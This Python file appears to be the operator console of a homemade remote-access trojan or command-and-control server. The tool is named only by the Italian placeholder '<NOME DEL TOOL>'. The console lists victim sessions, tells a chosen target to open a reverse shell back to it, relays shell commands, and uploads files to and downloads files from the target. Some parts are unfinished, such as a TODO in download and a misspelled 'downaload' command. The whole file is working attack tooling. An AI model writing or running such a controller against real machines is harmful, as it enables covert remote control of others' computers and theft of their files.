import socket
import json
import sys
import time
import random
import subprocess
import threading

HOST = "127.0.0.1" # Address to listen on
PORT = 6969 # Port to listen on. (Better to use unprivileged ports)

connections = list() # List of active connections 

def send_command(conn, *args):
    """Send a command to the target"""
    conn.send(json.dumps(args).encode())

def wait_response(conn):
    """Gets a response from the target"""
    raw = conn.recv(1024).decode()
    data = json.loads(raw)
    return data

def shell(conn): 
    """Actions performed when the shell command is typed"""
    print("\033[96m[INFO] Dropping into a shell...\033[91m")
    time.sleep(0.5)
    port = random.randint(49152, 65525) # Generate a random port for the reverse shell
    send_command(conn, "shell", port)

    lst = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creates a new socket for the reverse shell
    lst.bind((HOST, port))
    lst.listen(1)
    cn, addr = lst.accept()
    while True:
        #Receive data from the target and get user input
        ans = cn.recv(1024).decode(errors='ignore')
        sys.stdout.write(ans)
        command = input()
        if command == 'exit':
            cn.close()
            print('\033[96m[INFO] Exiting the reverse shell...\033[0m')
            break

        #Send command
        command += "\n"
        cn.send(command.encode())
        time.sleep(1)
        sys.stdout.write("\033[A" + ans.split("\n")[-1])

def upload_file(conn, local_path, remote_path):
    print("\033[96m[INFO] Uploading the specified file...\033[0m")
    f = open(local_path, 'rt')
    content = f.read()

    send_command(conn, 'upload', content, remote_path)

    upload_status = wait_response(conn)
    if upload_status == 'done':
        print('\033[92m[INFO] File uploaded successfully!\033[0m')
    else:
        print('\033[93m[WARN] There was an error uploading the file. Error:\n', upload_status, '\033[0m\n')

def download_file(conn, remote_path):
    print("\033[96m[INFO] Retrieving the requested file...\033[0m")
    send_command(conn, 'download', remote_path)

    f = wait_response(conn) # TODO: to be finished...
    
def listen_for_connections(server):
    """Continuously listen for new incoming connections"""
    while True:
        connection, address = server.accept()
        print(f"\033[92m[INFO] Connection received from {address}\033[0m")
        connections.append([connection, address]) # Appends the connection to the connections list


if __name__ == '__main__':
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    print(f"[INFO] Listening on {HOST}:{PORT}")
    server.listen(1)
    # Starting a thread which continuously listens for new connections
    threading.Thread(target=listen_for_connections, args=(server, )).start()
    session = 0 # Current active session. Default is the first session
    while True:
        while True:
            command = input("\033[1mCMD> \033[0m") # Request user command input
            parameters = command.split(' ')
            match parameters[0]: # Parse user command input
                case 'help': # Print an help message
                    print("""
                        \n<NOME DEL TOOL> 0.1
                        Usage: CMD> [command] [options]

                        COMMANDS:
                            help: Displays this prompt
                            sessions: Lists all the active sessions
                            session <number>: Select the specified session
                            shell: Opens a reverse shell on the target
                            upload <local_file> <destination_path>: Uploads a specified file (absolute local path)
                            download <remote_file>: Downloads a file from the remote host\n
                        """)
                case 'sessions': 
                    i = 0
                    for connection in connections: # Parse all the connections stored to list them
                        print(f"{i} ---- {connection[1]} ----", "\033[92mcurrent\033[0m" if i == session else " ")
                        i += 1
                case 'session':
                    session = int(parameters[1])
                    print(f"Selected session {session} on host {connections[session][1]}")
                case 'shell':
                    shell(connections[session][0])
                case 'upload':
                    upload_file(connections[session][0], parameters[1], parameters[2])
                case 'downaload':
                    download_file(connections[session][0], parameters[1])

"""
Colors (to be removed...):
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
"""